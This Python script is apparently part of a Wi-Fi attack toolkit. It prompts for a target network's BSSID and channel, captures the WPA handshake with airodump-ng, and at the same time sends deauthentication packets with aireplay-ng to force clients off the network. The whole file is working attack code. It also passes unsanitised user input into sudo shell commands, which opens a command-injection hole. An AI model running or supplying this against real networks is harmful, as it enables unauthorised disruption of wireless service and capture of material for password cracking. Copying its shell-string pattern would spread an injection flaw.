#!/usr/bin/env python3

import subprocess
import psutil
import main
import threading
import time

def handshake():
	while True:
		subprocess.run(["clear"])
		intErface=list(psutil.net_if_stats().keys())
		lenList=len(intErface)
		for serialNum in range(1,(lenList+1)):
			print(str(serialNum)+"."+intErface[serialNum-1])
		print(str(lenList+1)+"."+"Exit")
		print("("+str(lenList+2)+" or 0)"+"."+"Mainmenu")
		try:
			inTerFacE=int(input("Choose the interface you want to capture handshake from : "))
			if inTerFacE <= lenList and inTerFacE != 0:
				inTERFACE=intErface[inTerFacE-1]
				def run_commnd(iTERFACE):
					bssid=input("Please Enter the BSSID of the Network that you Notedown(correctly): ")
					chanel=input("Please Enter the CHANNEL number that you Notedown: ")
					packets=input("Enter the no.of deauthentication packets(any number from 20-50): ")
					print("########## Handshake will be stored in this folder with BSSID name" "######")
					def handshakel(bSSid,cHanel,iTERFACE):
						subprocess.run(["xterm","-e","mkdir "+bSSid+";cd "+bSSid+";sudo airodump-ng -d "+bSSid+ " -c "+cHanel+" -w "+bSSid+" "+iTERFACE])
					def packetsent(bSSid,pacKets,iTERFACE):
						subprocess.run(["xterm","-e","sudo aireplay-ng -a "+bSSid+" --deauth "+pacKets+" "+iTERFACE])

					firsT_thread=threading.Thread(target=handshakel,args=(bssid,chanel,inTERFACE))
					seconD_thread=threading.Thread(target=packetsent,args=(bssid,packets,inTERFACE))
					firsT_thread.start()
					time.sleep(8)
					seconD_thread.start()
					subprocess.run(["clear"])
				run_commnd(inTERFACE)
			elif inTerFacE == lenList+1 and inTerFacE != 0:
				subprocess.run(["clear"])
				exit()
			else:
				subprocess.run(["clear"])
				main.main()
		except ValueError:
			print("Please Enter a Number from above list")
if __name__=="__main__":
	handshake()
